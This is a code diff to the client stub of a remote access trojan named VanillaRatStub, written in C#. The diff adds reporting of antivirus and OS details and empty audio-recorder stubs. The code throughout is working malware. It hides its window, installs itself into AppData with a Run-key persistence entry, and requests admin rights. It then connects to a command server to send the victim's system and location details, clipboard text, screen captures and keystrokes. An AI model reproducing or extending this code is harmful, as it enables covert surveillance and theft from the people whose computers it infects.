@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Configuration;
 using System.Diagnostics;
-using System.Diagnostics.Eventing.Reader;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -32,10 +30,15 @@ namespace VanillaRatStub
         private static bool RDActive;
         private static bool USActive;
         private static bool KLActive;
+        private static bool ARActive;
         private static bool ReceivingFile;
         private static string FileToWrite = "";
         private static int UpdateInterval;
-        private static readonly string InstallDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
+
+        private static readonly string InstallDirectory =
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
+            AppDomain.CurrentDomain.FriendlyName;
+
         private static ApplicationContext MsgLoop;
 
         [DllImport("kernel32.dll")]
@@ -56,14 +59,34 @@ namespace VanillaRatStub
         [DllImport("gdi32.dll")]
         internal static extern bool DeleteDC([In] IntPtr hdc);
 
-        #region Entry Point
+        #region Connection & Data Loop
+        //Try to connect to main server
+        private static void Connect()
+        {
+            while (!Networking.MainClient.Connected)
+            {
+                Thread.Sleep(20);
+                Networking.MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
+            }
 
+            while (Networking.MainClient.Connected)
+            {
+                Thread.Sleep(UpdateInterval);
+                GetRecievedData();
+            }
+        }
+
+        #endregion Connection & Data Loop
+
+        #region Entry Point
+        //Check if it is installed
         private static bool IsInstalled()
         {
             if (ExecutablePath == InstallDirectory)
                 return true;
             return false;
         }
+        //Raise to admin
         private static void RaisePerms()
         {
             Process P = new Process();
@@ -73,21 +96,18 @@ namespace VanillaRatStub
             P.Start();
             Environment.Exit(0);
         }
-
+        //Check if admin
         private static bool IsAdmin()
         {
             return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                 .IsInRole(WindowsBuiltInRole.Administrator);
         }
+        //Check settings and start connect
         private static void Main(string[] args)
         {
             UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
-            if (ClientSettings.Admin == "True")
-            {
-                RaisePerms();
-            }
             if (ClientSettings.Install == "True" && !IsInstalled())
             {
                 if (!IsAdmin())
@@ -108,23 +128,31 @@ namespace VanillaRatStub
                         {
                             RK.DeleteValue("VCLIENT", false);
                         }
-                        catch { }
+                        catch
+                        {
+                        }
+
                         try
                         {
                             RK.SetValue("VCLIENT", ExecutablePath);
                         }
-                        catch { }
+                        catch
+                        {
+                        }
                     }
                 }
-            }           
+            }
+
             Connect();
             Console.ReadKey();
         }
+        //Uninstall client
         private static void UninstallClient()
         {
             try
             {
-                RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                RegistryKey RK =
+                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 RK.DeleteValue("VCLIENT", false);
             }
             catch (Exception e)
@@ -134,30 +162,11 @@ namespace VanillaRatStub
             }
         }
 
-
         #endregion Entry Point
-
-        #region Connection & Data Loop
-
-        private static void Connect()
-        {
-            while (!Networking.MainClient.Connected)
-            {
-                Thread.Sleep(20);
-                Networking.MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
-            }
-
-            while (Networking.MainClient.Connected)
-            {
-                Thread.Sleep(UpdateInterval);
-                GetRecievedData();
-            }
-        }
-
-        #endregion Connection & Data Loop
 
         #region Data Handler & Grabber
 
+        //Get data sent to client
         private static void GetRecievedData()
         {
             Message Data;
@@ -169,6 +178,16 @@ namespace VanillaRatStub
                         List<byte> ToSend = new List<byte>();
                         ToSend.Add(2); //Client Tag
                         ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
+                        Networking.MainClient.Send(ToSend.ToArray());
+                        ToSend.Clear();
+                        ToSend.Add(14); //AntiVirus Tag
+                        ToSend.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
+                        Networking.MainClient.Send(ToSend.ToArray());
+                        string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
+                            .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
+                        ToSend.Clear();
+                        ToSend.Add(15); //Operating System Tag
+                        ToSend.AddRange(Encoding.ASCII.GetBytes(OperatingSystemUnDetailed));
                         Networking.MainClient.Send(ToSend.ToArray());
                         break;
 
@@ -183,6 +202,7 @@ namespace VanillaRatStub
                 }
         }
 
+        //Handle data sent to client
         [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
         private static void HandleData(byte[] RawData)
         {
@@ -363,11 +383,11 @@ namespace VanillaRatStub
                 ComputerInfoList.Add("Computer GPU: " + ComputerInfo.GetGPU());
                 ComputerInfoList.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
                 ComputerInfoList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
+                ComputerInfoList.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
                 ComputerInfoList.Add("Country: " + ComputerInfo.GeoInfo.Country);
                 ComputerInfoList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
                 ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
-                string[] ComputerInfoListArray = ComputerInfoList.ToArray();
-                foreach (string Info in ComputerInfoListArray) ListString += "," + Info;
+                foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(4); //Information Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
@@ -516,7 +536,7 @@ namespace VanillaRatStub
                 {
                     string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                     Thread STAThread = new Thread(
-                        delegate ()
+                        delegate()
                         {
                             if (Clipboard.ContainsText(TextDataFormat.Text))
                                 ClipboardText = Clipboard.GetText(TextDataFormat.Text);
@@ -542,19 +562,37 @@ namespace VanillaRatStub
             {
                 USActive = false;
                 if (UsageThread.ThreadState == ThreadState.Running) UsageThread.Abort();
-            } else if (StringForm.Equals("StartKL"))
+            }
+            else if (StringForm.Equals("StartKL"))
             {
                 Keylogger.SendKeys = true;
-                KLActive = true;               
+                KLActive = true;
                 if (KeyloggerThread.ThreadState != ThreadState.Running) KeyloggerThread.Start();
-            } else if (StringForm.Equals("StopKL"))
+            }
+            else if (StringForm.Equals("StopKL"))
             {
                 Keylogger.SendKeys = false;
                 KLActive = false;
                 if (KeyloggerThread.ThreadState == ThreadState.Running) KeyloggerThread.Abort();
+            } else if (StringForm.Equals("StartAR"))
+            {
+
+            } else if (StringForm.Equals("StopAR"))
+            {
+
             }
         }
+
+        #region Audio Recorder        
+        private static void RecordAudio()
+        {
+
+        }
+        #endregion
+
         #region Remote Desktop
+
+        //Stream screen to server
         private static void StreamScreen()
         {
             while (RDActive && Networking.MainClient.Connected)
@@ -581,6 +619,7 @@ namespace VanillaRatStub
             }
         }
 
+        //Get image of desktop
         private static Bitmap GetDesktopImage()
         {
             Rectangle Bounds = Screen.PrimaryScreen.Bounds;
@@ -599,16 +638,21 @@ namespace VanillaRatStub
         }
 
         #endregion Remote Desktop
+
         #region KL
 
+        //Stream keys to server 
         private static void StreamKeys()
         {
             Keylogger K = new Keylogger();
-            K.InitKeylogger();     
+            K.InitKeylogger();
         }
+
         #endregion
+
         #region UsageStream
 
+        //Stream hardware usage to server
         private static void StreamUsage()
         {
             PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
